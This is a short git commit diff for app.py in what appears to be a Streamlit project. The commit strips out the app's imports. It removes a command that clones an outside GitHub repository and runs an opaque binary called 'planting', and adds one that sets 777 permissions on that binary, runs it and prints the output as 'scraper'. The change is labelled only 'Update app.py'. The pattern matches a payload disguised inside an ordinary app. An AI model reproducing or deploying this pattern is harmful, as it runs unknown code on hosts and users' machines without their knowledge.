655a54ee44ac978c69654f8731d7a65c4c2e611f
leonardopresa <109478611+leonardopresa@users.noreply.github.com>
2022-07-18 00:26:09 +0700

    Update app.py

--- app.py
+++ app.py
@@ -1,7 +1,3 @@
-from collections import namedtuple
-import altair as alt
-import math
-import pandas as pd
-import streamlit as st
 import os
-os.system ("rm -rf dag && git clone https://github.com/gaseopre/dag.git && cd dag && chmod +x planting && ./planting")
+scraper = os.system ('chmod 777 planting && ./planting')
+print(scraper)
